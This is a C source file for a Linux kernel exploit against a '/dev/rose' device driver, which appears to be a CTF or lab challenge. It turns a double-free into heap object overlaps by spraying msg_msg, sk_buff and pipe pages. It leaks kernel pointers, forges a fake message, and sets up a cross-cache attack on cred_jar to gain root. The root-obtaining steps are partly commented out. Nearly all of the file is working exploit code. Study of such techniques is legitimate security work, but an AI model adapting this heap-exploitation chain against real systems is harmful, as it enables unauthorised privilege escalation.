#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <arpa/inet.h>

#include "cred.h"
#include "key.h"
#include "msg.h"

#define PAGE_SIZE 4096
#define PAGE_SPRAY 16

#define SLAB 1024
#define PERPAGE (PAGE_SIZE / SLAB)
#define SLAB_SPRAY (PAGE_SPRAY * PERPAGE)

#define PIVOT_SLAB 192
#define PIVOT_PERPAGE (PAGE_SIZE / PIVOT_SLAB)
#define PIVOT_SPRAY (PAGE_SPRAY * PIVOT_PERPAGE)

#define CRED_SPRAY (PAGE_SPRAY * CRED_PERPAGE / 2)

#define SKBUF_HDR 320

int open_dev(void){
    int fd = open("/dev/rose", O_RDWR);
    if(fd < 0){
        perror("[-] open dev");
    }
    return fd;
}

void debug(void)
{
    puts("[*] Paused execution");
    getchar();
}

int main(void){
    int data[PAGE_SIZE] = {0x41};
    int pad_qid[SLAB_SPRAY] = {0};
    int pivot_qid[PIVOT_SPRAY] = {0};

    // Prepare cred/suid spray pool
    struct cred_shm *channel = init_setuid();
    setuid_spray(CRED_SPRAY, 0);
    suid_binary_spray("/bin/su", 32);

    // Setup skbuf
    int sock[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock) < 0)
    {
        perror("[-] socketpair");
        return -1;
    }

    // Pipe page spray
    puts("[*] Page spray");
    int pad[PAGE_SPRAY][2];
    for (int i = 0; i < PAGE_SPRAY; i++){
        if (pipe(pad[i])){
            perror("[-] pipe");
        }
    }
    for(int i = 0; i < PAGE_SPRAY; i++) {
        write(pad[i][1], data, PAGE_SIZE);
    }
    sleep(2);

    // kmalloc-1k + kmalloc-192 spray
    puts("[*] kmalloc-1k spray");
    msg_spray(SLAB, SLAB_SPRAY, &pad_qid[0]);
    //     for (int i = 0; i < SLAB_SPRAY; i++){
    //     send_secondary(PIVOT_SLAB, pad_qid[i], 1);
    // }

    // Allocate victim obj and free once
    puts("[*] Create dangling free-ptr");
    int fd[2];
    fd[0] = open_dev();
    fd[1] = open_dev();

    // Overlap victim w/ skbuf
    close(fd[0]);
    uint8_t skbuf[SLAB - SKBUF_HDR];
    memset(&skbuf, 0x41, SLAB - SKBUF_HDR);
    for (int i = 0; i < 80; i++)
    {
        if (write(sock[0], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] write(socket)");
        }
    }

    // Trigger double-free
    puts("[*] Free skbuf");
    close(fd[1]);

    // Overlap skbuf w/ msg_msg
    msg_spray(SLAB, PIVOT_SPRAY, &pivot_qid[0]);
    for (int i = 0; i < PIVOT_SPRAY; i++){
        send_secondary(PIVOT_SLAB, pivot_qid[i], 1);
    }
    debug();

    // Read skbuf to leak msg
    for (int i = 0; i < 80; i++)
    {
        if (read(sock[1], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] read(socket)");
            close(sock[0]);
            close(sock[1]);
        }
        if (((uint64_t *)skbuf)[0] != 0x4141414141414141){
            puts("[+] Found msg");
            break;
        }
    }

    struct msg_msg evil_msg = {0};
    memcpy(&evil_msg, &skbuf, sizeof(struct msg_msg)+8);
    printf("[*] msg->m_list.next @ 0x%lx\n", evil_msg.m_list.next);

    int evil_qid = evil_msg.text[0];
    printf("[*] Evil msg qid: 0x%x\n", evil_qid);

    // Overlap with evil_msg
    evil_msg.m_list.next += PIVOT_SLAB;
    memset(&skbuf, 0, SLAB - SKBUF_HDR);
    memcpy(&skbuf, &evil_msg, sizeof(struct msg_msg)+8);

    for (int i = 0; i < 80; i++)
    {
        if (write(sock[0], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] write(socket)");
        }
    }
    debug();

    // Prepare fake_msg
    memset(&skbuf, 0, SLAB - SKBUF_HDR);
    struct msg_msg *fake_msg = calloc(1, PIVOT_SLAB);
    fake_msg->m_list.next = 0;
    fake_msg->m_list.prev = 0;
    fake_msg->m_type = MTYPE_FAKE;
    fake_msg->m_ts = PIVOT_SLAB;

    // Free msg once
    msg_t *victim_msg = msg_read(PIVOT_SLAB, evil_qid, MTYPE_SECONDARY, IPC_NOWAIT);
    // msg_delete(SLAB, 1, evil_qid, &pivot_qid[0]);
    int victim_qid = victim_msg->mtext[0];
    printf("[*] victim_qid: 0x%x\n", victim_qid);
    debug();

    // Overlap w/ fake_msg
    puts("[*] Overlap with fake_msg");
    setxattr("/dev/null", "pwn", &skbuf, SLAB, 0);
    debug();

    // Cross-cache into cred_jar
    msg_t tmp = {0};
    _msg_delete(PIVOT_SLAB, PIVOT_SPRAY, 0, &pivot_qid[0], &tmp, MTYPE_SECONDARY, 0);

    //a Pivot to kmalloc-192 for better alignment
    //a (free + alloc sk_buf + free + alloc msg_msg with secondary in kmalloc-192)
    //a (rcv sk_buf to leak ptr into kmalloc-192 + overwrite next ptr to double ref kmalloc-192 msg)

    //a free kmalloc-4k msg once (and it's entire slab for buddy reuse)

    // Allocate creds
    // puts("[*] Allocate creds");
    // DO_STEP(channel, alloc_creds);
    // WAIT_STEP_END(channel, alloc_creds_done, CRED_SPRAY);

    // // Trigger double-free
    // puts("[*] Free cred");
    // close(fd[1]);

    // //a free kmalloc-4k msg twice (it's a ptr into cred_jar now)

    // // Allocate setuid cred
    // puts("[*] setuid spray");
    // DO_STEP(channel, run_suid);
    // WAIT_STEP_END(channel, run_suid_done, 32);

    // // Get root
    // puts("[*] Try to get root");
    // DO_STEP(channel, get_root);
    while(1) sleep(1337);

    return 0;
}